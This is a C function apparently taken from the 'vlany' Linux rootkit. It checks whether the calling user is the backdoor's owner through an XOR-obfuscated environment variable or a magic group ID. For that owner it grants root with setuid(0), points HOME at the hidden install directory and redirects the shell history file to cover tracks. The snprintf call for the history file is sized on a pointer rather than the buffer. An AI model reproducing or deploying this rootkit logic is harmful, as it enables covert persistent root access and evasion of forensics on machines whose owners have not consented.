int owned(void)
{
    /*
     * the following function checks if the environment variable that is set when the user connects to the
     * backdoor has been set. and if it has, then the calling user is the owner of vlany
     */

    #ifdef DEBUG
        printf("[vlany] checking if current user is owner of vlanyrk\n");
    #endif

    int own;
    char *env_var = strdup(ENV_VAR); xor(env_var);

    if((getenv(env_var) != NULL && getuid() == 0) || getgid() == MAGIC_GID)
    {
        #ifdef VERBOSE_DEBUG
            printf("[vlany] current user is in fact owner of vlany. cleaning up\n");
        #endif

        /*
         * the environment variable exists, the user calling the call is the owner of vlany, putenv(), cleanup and return true
         */

        setuid(0);

        // clean up in case we're in the accept backdoor..
        char _install_dir[256], *install_dir = strdup(INSTALL_DIR); xor(install_dir);
        snprintf(_install_dir, sizeof(_install_dir), "HOME=%s", install_dir);
        putenv(_install_dir);
        CLEAN(install_dir);

        char _histfile[256], *histfile = strdup(HISTFILE); xor(histfile);
        unsetenv("HISTFILE");
        snprintf(_histfile, sizeof(histfile), "HISTFILE=%s", histfile);
        putenv(_histfile);
        CLEAN(histfile);

        own = 1;
    }else{
        #ifdef VERBOSE_DEBUG
            printf("[vlany] current user is not owner of vlany\n");
        #endif
        own = 0;
    }

    CLEAN(env_var);

    return own;
}
